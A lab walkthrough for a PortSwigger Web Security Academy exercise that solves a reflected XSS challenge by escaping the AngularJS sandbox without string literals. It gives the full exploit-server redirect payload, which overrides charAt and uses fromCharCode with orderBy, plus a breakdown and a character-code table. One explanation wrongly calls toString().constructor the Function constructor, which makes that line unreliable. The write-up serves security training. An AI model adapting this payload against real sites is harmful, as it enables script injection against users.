# Lab 25: Reflected XSS with AngularJS sandbox escape without strings

**Category:** Cross-Site Scripting (XSS)  
**Difficulty:** Expert  
**Lab link:** [Reflected XSS with AngularJS sandbox escape without strings](https://portswigger.net/web-security/cross-site-scripting/contexts/client-side-template-injection/lab-angular-sandbox-escape-without-strings)

## Overview

The app uses AngularJS with the sandbox enabled, which restricts expression evaluation by checking properties character-by-character via `charAt`. The search input is reflected within the AngularJS scope. String literals (quotes) are blocked. The exploit chains a sandbox escape with string-free function construction.

## Key Concepts

- **AngularJS sandbox:** Restricts access to dangerous properties (`constructor`, `window`, etc.) by inspecting expressions character-by-character using `charAt`
- **charAt override:** Overwriting `String.prototype.charAt` with `[].join` breaks the sandbox's validation — returns full strings instead of single characters
- **`fromCharCode` replaces strings:** Build code strings from numeric character codes when quotes are blocked
- **`orderBy` filter as execution sink:** `[array]|orderBy:expression` evaluates the expression as a function

## Solution

1. Go to exploit server, set body to:

```html
<script>
location='https://LAB-ID.web-security-academy.net/?search=1&toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1';
</script>
```

2. Store → Deliver to victim

## Payload Breakdown

The URL query string:
```
?search=1&toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1
```

**Part 1 — Sandbox escape:**
- `toString().constructor.prototype.charAt=[].join` — overwrites `charAt` with `[].join`, which returns the full string instead of a single character, breaking the sandbox's character-by-character safety check

**Part 2 — String-free execution:**
- `[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)`
- `toString().constructor` = `Function` constructor
- `fromCharCode(120,61,97,108,101,114,116,40,49,41)` = `x=alert(1)`
- `orderBy` filter executes `Function('x=alert(1)')` on the array `[1]`

## Character Code Reference

| Char | Code |
|------|------|
| x | 120 |
| = | 61 |
| a | 97 |
| l | 108 |
| e | 101 |
| r | 114 |
| t | 116 |
| ( | 40 |
| 1 | 49 |
| ) | 41 |
